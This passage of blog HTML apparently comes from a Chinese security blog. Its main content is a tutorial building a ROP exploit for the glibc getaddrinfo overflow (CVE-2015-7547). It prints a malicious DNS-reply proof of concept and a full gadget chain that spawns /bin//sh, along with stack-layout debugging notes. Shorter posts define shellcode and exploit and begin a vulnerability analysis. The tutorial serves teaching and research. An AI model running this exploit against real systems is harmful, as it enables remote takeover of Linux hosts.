&amp;herrnop</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">x00000000</span>)    # &amp;ttlp</span></div><div class=\"line\"></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xb7f183e0</span>)    #pop ecx;pop eax;ret</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += '/bin'</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a018</span>)   # @ .<span class=\"keyword\">data</span></span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e5f37f</span>)   # mov [eax] ecx ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7f183e0</span>)   # pop ecx ; pop eax ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += '//sh'              </span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a01c</span>)   # @ .<span class=\"keyword\">data</span> + 4</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e5f37f</span>)   # mov [eax] ecx ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e706de</span>)   # xor eax eax ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e5fadb</span>)   # pop ecx ; pop edx ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a020</span>)   # @ .<span class=\"keyword\">data</span> + 8</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x90909090</span>)   # </span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e60514</span>)   # mov [ecx] eax ; or eax -0x1 ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e5fadb</span>)   # pop ecx ; pop edx ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a020</span>)   # @ .<span class=\"keyword\">data</span> + 8</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a020</span>)   # @ .<span class=\"keyword\">data</span> + 8</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e4d646</span>)   # pop ebx ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a018</span>)   # @ .<span class=\"keyword\">data</span></span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e706de</span>)   # xor eax eax ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7f65c56</span>)   # add eax 0xb ;;</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7fdca70</span>)   # int 0x80 ;;</span></div><div class=\"line\">      </div><div class=\"line\">      data2_reply = dw(len(<span class=\"class\"><span class=\"keyword\">data</span>)) + <span class=\"keyword\">data</span></span></div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      data2_reply = <span class=\"type\">None</span></div><div class=\"line\"></div><div class=\"line\">    reply_now.set()</div><div class=\"line\">    time.sleep(<span class=\"number\">0.01</span>)</div><div class=\"line\">    conn.sendall(data1_reply)</div><div class=\"line\">    time.sleep(<span class=\"number\">0.01</span>)</div><div class=\"line\">    <span class=\"keyword\">if</span> data2:</div><div class=\"line\">      conn.sendall(data2_reply)</div><div class=\"line\"></div><div class=\"line\">    reply_now.clear()</div><div class=\"line\"></div><div class=\"line\">  sock_tcp.shutdown(socket.<span class=\"type\">SHUT_RDWR</span>)</div><div class=\"line\">  sock_tcp.close()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</div><div class=\"line\"></div><div class=\"line\"> t = threading.<span class=\"type\">Thread</span>(target=udp_thread)</div><div class=\"line\"> t.daemon = <span class=\"type\">True</span></div><div class=\"line\"> t.start()</div><div class=\"line\"> tcp_thread()</div><div class=\"line\"> terminate = <span class=\"type\">True</span></div></pre></td></tr></table></figure>\n<p>此 POC 基于 google 的溢出POC。<br>核心部分，代码 line 151 ~ 194 data的构造。<br> <font color=\"red\">Tips：</font>因为我把 ASLR 关了，此 POC 并不是通用的，不同机器，可能 gadget 的地址不一样。</p>\n<p>不过不要紧，本文将一步步带领大家构造 shellcode，加深对 ROP 的理解。</p>\n<h1 id=\"Ⅱ、栈布局\"><a href=\"#Ⅱ、栈布局\" class=\"headerlink\" title=\"Ⅱ、栈布局\"></a>Ⅱ、栈布局</h1> <font color=\"red\">Tips：变量在 gdb 调试过程中的位置，和实际运行时的位置是有差别的</font>\n\n<p>此时 core 文件就显得尤为重要，当程序崩溃时，内核把该程序当前内存映射到core文件里。因此 core 文件保存的是程序运行出错时的实际地址。</p>\n<h2 id=\"①-gdb-调试下栈布局\"><a href=\"#①-gdb-调试下栈布局\" class=\"headerlink\" title=\"① gdb 调试下栈布局\"></a>① gdb 调试下栈布局</h2><p>根据上篇文章分析，可以绘制出 gdb 调试下栈空间：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3b2alqd3bj30bx07s0su.jpg\" alt=\"\"></p>\n<h2 id=\"②-运行过程中，实际栈布局\"><a href=\"#②-运行过程中，实际栈布局\" class=\"headerlink\" title=\"② 运行过程中，实际栈布局\"></a>② 运行过程中，实际栈布局</h2><p>变量相对位置固定，只是基址变了，因此可以通过修改源码，打印 stackbuffer 的起始位置，绘制实际栈布局。</p>\n<p>stackbuffer 是在 _nss_dns_gethostbyname4_r 函数中分配的<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">host_buffer.<span class=\"keyword\">buf </span>= <span class=\"keyword\">orig_host_buffer </span>= (querybuf *) alloca (<span class=\"number\">2048</span>)<span class=\"comment\">;</span></div></pre></td></tr></table></figure></p>\n<p>在此 buffer 分配空间之后，free 之前的任意位置，打印出变量地址。<br><figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">printf</span>(<span class=\"string\">\"&amp;host_buffer.buf = %p host_buffer.buf = %p \\n\"</span>,&amp;host_buffer.buf , host_buffer.buf);</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f39wyn3kqij30hm06f0t4.jpg\" alt=\"\"><br>分配空间之后，立即打印，以免后续覆盖，影响结果。</p>\n<p>运行 poc<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f39x0dgwgjj30hh023aaz.jpg\" alt=\"\"><br>buffer 起始地址 0xbfffe1c0，栈布局如下：</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f3b2cvqpndj30bz07s3ym.jpg\" alt=\"\"></p>\n<h1 id=\"Ⅲ、非零校验\"><a href=\"#Ⅲ、非零校验\" class=\"headerlink\" title=\"Ⅲ、非零校验\"></a>Ⅲ、非零校验</h1><p>了解 _nss_dns_gethostbyname4_r 栈结构之后，首先对其进行溢出测试。<br>修改py文件中TCP发送的 data 数据长度。将数据长度设置为 0x800 + 0x6C = 0x86C，将发送的数据修改为 0<br>dw 转换后占两个字节，db 将 int 转为 char 占一个字节<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f3b2godjbtj30au03974l.jpg\" alt=\"\"></p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f39xlu5c2hj30k3037dha.jpg\" alt=\"\"></p>\n<p>根据执行结果可知，在__libc_res_nquery的262行，对hp和hp2进行非零校验。<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f39xv4sosrj30i901ut8x.jpg\" alt=\"\"></p>\n<p>将 data 换成非溢出长度，打印出此变量地址<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3a2o1rmupj30ae03vjrt.jpg\" alt=\"\"><br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f39xwf33z9j30kr026q3m.jpg\" alt=\"\"></p>\n<p>重新编译运行 POC，在 gdb 下调试，查看 hp 和 hp2 的位置。<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f39yflxqmej30j407pjvk.jpg\" alt=\"\"><br>因此 hp 和 hp2 分别位于 0xbfffe9ac 和 0xbfffe9a8，hp和hp2分别指向申请的堆空间和栈空间。</p>\n<p>因此 gdb 中栈空间布局：<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f3b2nfiafbj30bx09fglu.jpg\" alt=\"\"></p>\n<p>将 hp 和 hp2 覆盖成 0<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3b2yu35evj30k60c2q5y.jpg\" alt=\"\"></p>\n<p>将 hp 和 hp2 换成之前打印出来的值：<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f3adu9z86vj30k70butas.jpg\" alt=\"\"><br> <font color=\"red\">hp2:0xbfffe1b0，时刻注意 gdb 中调试地址和程序实际地址不一样，编写 shellcode 时，填写实际运行地址</font></p>\n<h1 id=\"Ⅳ、free-指针处理\"><a href=\"#Ⅳ、free-指针处理\" class=\"headerlink\" title=\"Ⅳ、free 指针处理\"></a>Ⅳ、free 指针处理</h1><p>淹没到返回地址之前</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f3aedzhbl4j30k60cfwgl.jpg\" alt=\"\"></p>\n<font color=\"red\">在 gdb 中调试 core 文件，此时看到的是运行时的实际地址，所以，EBP：0xbfffea18</font>   \n\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f3aeg17c9pj30iu0bon40.jpg\" alt=\"\"></p>\n<p>在 _nss_dns_gethostbyname4_r 中会检测是否在解析的过程中申请了新的堆空间，如果申请了，则会对该空间进行free。</p>\n<p>_nss_dns_gethostbyname4_r 函数的最后：<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f3aehnc8roj30gj08fwg5.jpg\" alt=\"\"></p>\n<p>即使 hp2（ans2p） 和 hp（host_buf） 通过了非零验证，但 free 时仍然会出错。此时ans2p 修改为 0xbfffe1b0，栈空间地址，不能释放，因此free 出错，此时需修改 ans2p_malloced 为0，让条件判断不成立。<br>通过源码调试 和 gdb 分析，可得出栈布局</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3aetbguv3j30c60cpwev.jpg\" alt=\"\"></p>\n<p>修改 poc 中 ans2p_malloced 为0<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3aewyyvd3j30k30bh0x9.jpg\" alt=\"\"></p>\n<p>此时 free 没有错误，但是依然断错，说明在 host_buf 到 EBP 之间的一些内部变量不能被覆盖为 0x42424242，在后续执行程序过程中依然会用到。<br>在 gdb 中查看这些变量的值，并填充在 shellcode 对应位置。</p>\n<font color=\"red\"> 时刻注意，gdb 中观察到的地址，和程序实际运行地址不一样，gdb调试时，EBP：0xbfffe9c8</font>\n\n<p>不覆盖 host_buf 到 EBP 之间的变量<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3af7s7jskj30k20bjdh9.jpg\" alt=\"\"></p>\n<p>gdb 调试，查看变量值<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f3afbx7cugj30jp0d9gnj.jpg\" alt=\"\"></p>\n<p>同时可以看到，ans2p_malloced 为0，只执行一次 free，因为 host_buffer.buf指向堆空间，可以正常释放，因此不会出错。</p>\n<p>经过反复试验，只用覆盖 EBP 之前的三个变量，因此 data 构造为<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f3afhx6l76j30k40c6abh.jpg\" alt=\"\"></p>\n<p><font color=\"red\"> 一定要注意，EBP 换成 0xbfffef58，而不是在 gdb 中看到的 0xbfffef08，不然会出段错。时刻注意 gdb 中的地址和程序实际运行地址不一样</font><br>转换方法<br>gdb中 &amp;EBP：0xbfffe9cc  EBP：0xbfffef08<br>实际运行 &amp;EBP：0xbfffea1c   ，根据相对位置不变，可得出 EBP = &amp;EBP + (&amp;EBP - EBP) = 0xbfffef58</p>\n<h1 id=\"Ⅴ、构造-shellcode\"><a href=\"#Ⅴ、构造-shellcode\" class=\"headerlink\" title=\"Ⅴ、构造 shellcode\"></a>Ⅴ、构造 shellcode</h1><p>构造 shellcode 不是本教程重点，关于如果构造 ROP shellcode，请参考我的博客 <a href=\"http://huirong.github.io/2016/03/11/ROP-exploit/\">ROP exploit 编写</a>。</p>\n<p>shellcode 功能：执行 system(“/bin/shell”)<br>gadgets:<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span><span class=\"comment\">;pop eax;ret</span></div><div class=\"line\">/bin</div><div class=\"line\">@.data</div><div class=\"line\"><span class=\"keyword\">mov</span> [<span class=\"built_in\">eax</span>] <span class=\"built_in\">ecx</span><span class=\"comment\">;ret</span></div><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span><span class=\"comment\">;pop eax;ret</span></div><div class=\"line\">@.data + <span class=\"number\">4</span></div><div class=\"line\"><span class=\"keyword\">mov</span> [<span class=\"built_in\">eax</span>] <span class=\"built_in\">ecx</span><span class=\"comment\">;ret</span></div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span> <span class=\"built_in\">eax</span><span class=\"comment\">;ret</span></div><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span><span class=\"comment\">;ret</span></div><div class=\"line\">@.data + <span class=\"number\">8</span></div><div class=\"line\"><span class=\"keyword\">mov</span> [<span class=\"built_in\">ecx</span>] <span class=\"built_in\">eax</span><span class=\"comment\">;ret</span></div><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span><span class=\"comment\">;pop edx;ret</span></div><div class=\"line\">@.data + <span class=\"number\">8</span></div><div class=\"line\">@.data + <span class=\"number\">8</span></div><div class=\"line\"><span class=\"keyword\">pop</span> <span class=\"built_in\">ebx</span><span class=\"comment\">;ret</span></div><div class=\"line\">@.data</div><div class=\"line\"><span class=\"keyword\">add</span> <span class=\"built_in\">eax</span> <span class=\"number\">0xb</span><span class=\"comment\">;ret</span></div><div class=\"line\"><span class=\"keyword\">int</span> <span class=\"number\">0x80</span><span class=\"comment\">;ret</span></div></pre></td></tr></table></figure></p>\n<p>根据之间的教程，查找对应 gadget 的实际地址。由于关闭了 ASLR，不同机器，实际地址可能不一样，我建议大家自己查找，也可加强 ROP shellcode 理解。<br>构造好的 data<br><figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> = ''</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += dw(<span class=\"title\">id2</span>)</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += '<span class=\"type\">B'</span> * (2106)</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += dw(0)                           # &amp;ans2p_malloced</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += dw(0)</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += '<span class=\"type\">B'</span> * (8)</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xbfffe1b0</span>)    #ans2p</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">x0804c3a8</span>)    #host_buffer.buf</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += '<span class=\"type\">B'</span> * (12)</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xb7fd3000</span>)</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xb7e23301</span>)</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">x00000420</span>)</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xbfffef58</span>)   # ebp</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xb7f183e0</span>)    #pop ecx;pop eax;ret</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += '/bin'</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a018</span>)   # @ .<span class=\"keyword\">data</span></span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e5f37f</span>)   # mov [eax] ecx ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7f183e0</span>)   # pop ecx ; pop eax ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += '//sh'              </span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a01c</span>)   # @ .<span class=\"keyword\">data</span> + 4</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e5f37f</span>)   # mov [eax] ecx ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e706de</span>)   # xor eax eax ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e5fadb</span>)   # pop ecx ; pop edx ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a020</span>)   # @ .<span class=\"keyword\">data</span> + 8</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x90909090</span>)   # </span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e60514</span>)   # mov [ecx] eax ; or eax -0x1 ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e5fadb</span>)   # pop ecx ; pop edx ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a020</span>)   # @ .<span class=\"keyword\">data</span> + 8</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a020</span>)   # @ .<span class=\"keyword\">data</span> + 8</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e4d646</span>)   # pop ebx ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">x0804a018</span>)   # @ .<span class=\"keyword\">data</span></span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7e706de</span>)   # xor eax eax ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7f65c56</span>)   # add eax 0xb ;;</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>', 0<span class=\"title\">xb7fdca70</span>)   # int 0x80 ;;</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f3ag18pvkej30k80cgjtd.jpg\" alt=\"\"><br>即使构造好了 shellcode 依然会出断错。</p>\n<h1 id=\"Ⅵ、调整-parameter\"><a href=\"#Ⅵ、调整-parameter\" class=\"headerlink\" title=\"Ⅵ、调整 parameter\"></a>Ⅵ、调整 parameter</h1><h2 id=\"①-查看参数地址\"><a href=\"#①-查看参数地址\" class=\"headerlink\" title=\"① 查看参数地址\"></a>① 查看参数地址</h2><p>稍安勿躁，继续使用 gdb 调试，编写实际shellcode的过程本身就很繁琐，大家要有耐心。<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f3ag51ewr1j30lk067jub.jpg\" alt=\"\"></p>\n<p>在调用 gaih_getanswer 时，不能访问参数指向的内存区。<br>细心的读者，可能发现了，0x6269622f 即 /bin，说明我们的 shellcode 覆盖了 gaih_getanswer 使用的参数。</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f3age6gv2yj30ka05qgns.jpg\" alt=\"\"></p>\n<p>在程序出错之前，打印参数的地址</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f3ages1p9sj30kt0eq43z.jpg\" alt=\"\"></p>\n<h2 id=\"②-绘制整体栈布局\"><a href=\"#②-绘制整体栈布局\" class=\"headerlink\" title=\"② 绘制整体栈布局\"></a>② 绘制整体栈布局</h2><p>根据上述所有的分析，可得出栈布局</p>\n<h3 id=\"1-gdb-中栈布局\"><a href=\"#1-gdb-中栈布局\" class=\"headerlink\" title=\"(1) gdb 中栈布局\"></a>(1) gdb 中栈布局</h3><p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3agh9snsxj30c60g70td.jpg\" alt=\"\"></p>\n<h3 id=\"2-实际运行时-栈布局\"><a href=\"#2-实际运行时-栈布局\" class=\"headerlink\" title=\"(2)实际运行时 栈布局\"></a>(2)实际运行时 栈布局</h3><p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f3b3jk046bj30c70g7q3k.jpg\" alt=\"\"></p>\n<h1 id=\"Ⅶ、调整返回地址\"><a href=\"#Ⅶ、调整返回地址\" class=\"headerlink\" title=\"Ⅶ、调整返回地址\"></a>Ⅶ、调整返回地址</h1><p>因为返回地址后面有七个参数，返回地址处要调整为 add esp 0x1c;ret<br>这样第一条 gadget 返回之后，esp 增大 28，忽略了这七个参数，跳转到第二条gadget pop ecx;pop eax;ret 出执行，然后执行完整个 shellcode</p>\n<p>shellcode 在本教程第一部分，大家可以返回查看。</p>\n<p>运行 client</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3agojiur4j30f502o754.jpg\" alt=\"\"></p>\n<p>OK！！！ shellcode成功运行，真是功夫不负有心人！！！！</p>\n<h1 id=\"Ⅷ、参考文献\"><a href=\"#Ⅷ、参考文献\" class=\"headerlink\" title=\"Ⅷ、参考文献\"></a>Ⅷ、参考文献</h1><p><a href=\"https://github.com/fjserna/CVE-2015-7547\" target=\"_blank\" rel=\"external\">Proof of concept for CVE-2015-7547</a><br><a href=\"http://blog.nsfocus.net/cve-2015-7547-vulnerability-analysis/\" target=\"_blank\" rel=\"external\">CVE-2015-7547的漏洞分析</a></p>\n"},{"title":"shellcode 与 exploit","url":"http://huirong.github.io/2016/04/16/shellcodeAndExploit/","content":"<p>对于刚开始学习缓冲区溢出的同学来讲，很容易混淆 shellcode、payload、exploit这些专有名词，本文详细分析了两者之间的关系。</p>\n<h1 id=\"Ⅰ、shellcode\"><a href=\"#Ⅰ、shellcode\" class=\"headerlink\" title=\"Ⅰ、shellcode\"></a>Ⅰ、shellcode</h1><h2 id=\"①-定义\"><a href=\"#①-定义\" class=\"headerlink\" title=\"① 定义\"></a>① 定义</h2><p>shellcode：缓冲区溢出攻击中植入进程的代码</p>\n<h2 id=\"②-功能\"><a href=\"#②-功能\" class=\"headerlink\" title=\"② 功能\"></a>② 功能</h2><ul>\n<li>可以是处于恶作剧弹出对话框</li>\n<li>可能是攻击性的，删除重要文件、窃取数据、上传木马病毒并运行</li>\n<li>出于破坏的，格式化磁盘</li>\n</ul>\n<p>shellcode 不局限于用于获取 shell 的代码，是广义上的植入进程中的代码。</p>\n<p>shellcode 通常用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到限制，开发和调试难度高。</p>\n<h1 id=\"Ⅱ、exploit\"><a href=\"#Ⅱ、exploit\" class=\"headerlink\" title=\"Ⅱ、exploit\"></a>Ⅱ、exploit</h1><p>植入代码之前需要做大量工作，例如，弄清程序有几个输入点，这些输入将最终会当做哪个函数的第几个参数读入到内存的哪一个区域，哪一个输入会造成栈溢出，在复制到栈区的时候对这些数据有没有额外的限制等。调试之后还要计算函数返回地址距离缓冲区距离的偏移并淹没，选择指令的地址，最终制作出一个有攻击效果的“承载”着 shellcode 的输入字符串。<br>这个代码植入的过程就是漏洞利用，也就是 exploit。</p>\n<p>exploit 一般以一段代码的形式出现，用于生成攻击性的网络数据包或其他形式的攻击性输入。exploit 的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode。exploit 一般是针对特定漏洞而言的。</p>\n<h1 id=\"Ⅲ、shellcode-与-exploit\"><a href=\"#Ⅲ、shellcode-与-exploit\" class=\"headerlink\" title=\"Ⅲ、shellcode 与 exploit\"></a>Ⅲ、shellcode 与 exploit</h1><p>漏洞利用过程就好像一枚导弹飞向目标的过程。<br>导弹的设计者关注的是怎样计算飞行路线，锁定目标，最终把弹头精确地运载到目的地并引爆，而不关心所承载的弹头到底是用来在地上砸一个坑的铅球，还是用来毁灭一个国家的核弹头。</p>\n<p>这就如同 exploit 关心的是怎样淹没返回地址，获得进程的控制权，把 EIP 传递给 shellcode 让其得到执行并发挥作用，而不关心 shellcode 到底是弹出一个消息框的恶作剧，还是用于格式化对方硬盘的穷凶极恶的代码。</p>\n"},{"title":"Linux glibc 缓冲区溢出漏洞分析(CVE-2015-7547) 分析","url":"http://huirong.github.io/2016/04/12/Linux-glibc-stackOverflow-CVE-2015-7547-analysis/","content":"<h1 id=\"I、glibc-漏洞简介\"><a href=\"#I、glibc-漏洞简介\" class=\"headerlink\" title=\"I、glibc 漏洞简介\"></a>I、glibc 漏洞简介</h1><p>Google 的安全研究团队披露了glibc getaddrinfo溢出漏洞。经研究发现，所有Debian、Red Hat以及更多其它Linux发行版，只要glibc版本大于2.9就会受到该溢出漏洞影响。攻击者可以通过该漏洞直接批量获取大量主机权限。</p>\n<p>在 getaddrinfo 函数中，若传递 <a 